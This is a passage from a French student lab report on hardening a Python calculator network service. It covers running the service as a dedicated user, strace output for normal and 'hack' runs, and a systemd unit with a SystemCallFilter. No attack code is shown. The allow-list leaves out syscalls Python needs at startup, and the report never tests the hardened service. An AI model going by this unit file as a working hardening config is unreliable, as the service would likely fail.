    [toto@localhost ~]$ sudo systemctl daemon-reload
    [toto@localhost ~]$ sudo systemctl restart calculatrice
```

**🌞 Prouvez que le service s'exécute désormais en tant que calculatrice**

```bash
    [toto@localhost ~]$ ps aux | grep calc.py
    calcula+    1443  0.0  0.4  10840  8192 ?        Ss   14:33   0:00 /usr/bin/python3 /opt/calc.py
    toto        1448  0.0  0.1   6412  2176 pts/0    S+   14:33   0:00 grep --color=auto calc.py
```

#### B. Syscalls

**🌞 Tracez l'exécution de l'application : normal**

```bash
    [toto@localhost ~]$ sudo strace -f -p $(pgrep -f "python3 /opt/calc.py") -o trace_normal.txt
    strace: Process 1294 attached
    [toto@localhost ~]$ cat trace_normal.txt 
    1294  accept4(3, {sa_family=AF_INET, sin_port=htons(47402), sin_addr=inet_addr("192.168.56.1")}, [16], SOCK_CLOEXEC) = 4
    1294  getsockname(4, {sa_family=AF_INET, sin_port=htons(13337), sin_addr=inet_addr("192.168.56.114")}, [128 => 16]) = 0
    1294  recvfrom(4, "\n", 1024, 0, NULL, NULL) = 1
    1294  sendto(4, "Hello", 5, 0, NULL, 0) = 5
    1294  recvfrom(4, "3+3\n", 1024, 0, NULL, NULL) = 4
    1294  sendto(4, "6", 1, 0, NULL, 0)     = 1
    1294  recvfrom(4, "\n", 1024, 0, NULL, NULL) = 1
    1294  sendto(4, "Hello", 5, 0, NULL, 0) = 5
    1294  recvfrom(4, "1+2\n", 1024, 0, NULL, NULL) = 4
    1294  sendto(4, "3", 1, 0, NULL, 0)     = 1
    1294  recvfrom(4, "3+2\n", 1024, 0, NULL, NULL) = 4
    1294  sendto(4, "Hello", 5, 0, NULL, 0) = 5
    1294  recvfrom(4, "2+2\n", 1024, 0, NULL, NULL) = 4
    1294  sendto(4, "4", 1, 0, NULL, 0)     = 1
    1294  recvfrom(4, "", 1024, 0, NULL, NULL) = 0
    1294  close(4)                          = 0
    1294  write(1, "Donn\303\251es re\303\247ues du client : b'\\"..., 195) = 195
    1294  rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fe84103e730}, {sa_handler=0x7fe8414d3f83, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fe84103e730}, 8) = 0
    1294  getsockname(3, {sa_family=AF_INET, sin_port=htons(13337), sin_addr=inet_addr("0.0.0.0")}, [16]) = 0
    1294  getpeername(3, 0x7ffd311ed8f0, [16]) = -1 ENOTCONN (Transport endpoint is not connected)
    1294  close(3)                          = 0
    1294  munmap(0x7fe8417ca000, 151552)    = 0
    1294  exit_group(0)                     = ?
    1294  +++ exited with 0 +++
```

**🌞 Tracez l'exécution de l'application : hack**

- Syscalls en plus 
```bash
    openat
    fstat
    mmap
    rseq
    mprotect
    prlimit64
    ioctl
    getrandom
    brk
    futex
    getuid
    geteuid
    access
    socket
    connect
    newfstatat
```

**🌞 Adaptez le .service**

```bash
    [toto@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service
    [Unit]
    Description=Super serveur calculatrice

    [Service]
    ExecStart=/usr/bin/python3 /opt/calc.py
    Restart=always
    User=calculatrice

    # Filtrage des appels système
    SystemCallFilter=accept4 getsockname recvfrom sendto close write rt_sigaction getpeername munmap exit_group
    SystemCallArchitectures=native
    NoNewPrivileges=yes

    [Install]
    WantedBy=multi-user.target

    [toto@localhost ~]$ sudo systemctl daemon-reload
    [toto@localhost ~]$ sudo systemctl restart calculatrice
```

---

**Conclusion**: Ceci cnclu donc le TP1
